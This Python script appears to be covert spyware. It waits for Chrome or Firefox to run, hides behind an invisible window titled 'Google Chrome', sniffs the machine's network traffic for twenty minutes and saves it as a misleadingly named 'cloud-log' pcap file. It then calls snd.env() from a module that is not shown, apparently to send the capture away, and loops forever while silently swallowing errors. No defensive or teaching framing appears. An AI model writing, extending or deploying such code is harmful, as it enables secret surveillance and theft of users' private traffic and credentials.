from scapy.all import sniff, wrpcap
import tkinter as tk
import time
import snd
import psutil
from datetime import datetime

def verif():
    for processo in psutil.process_iter(['name']):
        if processo.info['name'].lower() in ['chrome.exe', 'firefox.exe']:
            return True
    return False

def pck():
    while True:
        try:
            capt = sniff(iface='Ethernet', timeout=1200)
            data = datetime.now().strftime('%H%M%S')
            name_pcap = f'cloud-log-{data}.pcap'
            wrpcap(name_pcap, capt)
            return True
        except Exception:
            time.sleep(30)

def main():
    window = tk.Tk()
    window.title("Google Chrome")
    window.geometry('400x200')
    window.withdraw()
    resp = pck()
    window.destroy()
    return resp

if __name__ == '__main__':
    while True:
        try:
            if verif():
                stat_one = main()
                if stat_one:
                    snd.env()
                time.sleep(5)
            else:
                time.sleep(10)
        except:
            time.sleep(30)
